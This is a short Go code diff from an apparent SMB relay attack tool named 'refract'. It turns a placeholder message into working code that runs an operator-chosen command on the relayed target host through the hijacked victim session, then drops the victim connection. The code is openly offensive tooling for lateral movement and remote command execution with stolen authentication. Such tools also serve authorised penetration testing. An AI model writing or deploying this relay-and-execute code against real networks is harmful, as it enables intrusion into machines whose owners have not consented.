@@ -305,7 +305,14 @@ func (b *Broker) handleSMBRelay(ctx context.Context, victim net.Conn) {
 	}
 
 	if b.cfg.PostCommand != "" {
-		log.Printf("[refract] post-relay exec not yet wired for SMB sessions (use -socks + proxychains)")
+		host := target.Hostname()
+		if err := RunPostCommand(targetConn, session.targetSessionID, host, b.cfg.PostCommand); err != nil {
+			log.Printf("[refract] post-command on %s failed: %v", host, err)
+		} else {
+			log.Printf("[+] post-command executed on %s: %s", host, b.cfg.PostCommand)
+		}
+		// Connection was used for the command; victim will time out naturally.
+		return
 	}
 }
 
